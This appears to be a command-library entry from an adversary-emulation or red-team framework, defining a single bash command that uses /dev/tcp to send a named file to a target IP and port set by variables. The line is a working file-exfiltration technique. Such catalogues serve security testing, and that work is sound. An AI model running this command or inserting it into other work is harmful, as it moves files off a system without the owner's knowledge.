---
id: be3fbbae-57e8-4450-ba82-57a4a0292ee5
name: cmd-be3fbbae
type: command
executor: bash
data: cat > /dev/tcp/$_TARGET_IP/$_TARGET_PORT < $_FILENAME
output: ''
created_at: '2023-03-13T19:52:35.078857+00:00'
updated_at: '2023-03-14T01:24:10.854795+00:00'
tools:
- '[[CAT]]'
---

# Command be3fbbae

```bash
cat > /dev/tcp/$_TARGET_IP/$_TARGET_PORT < $_FILENAME
```


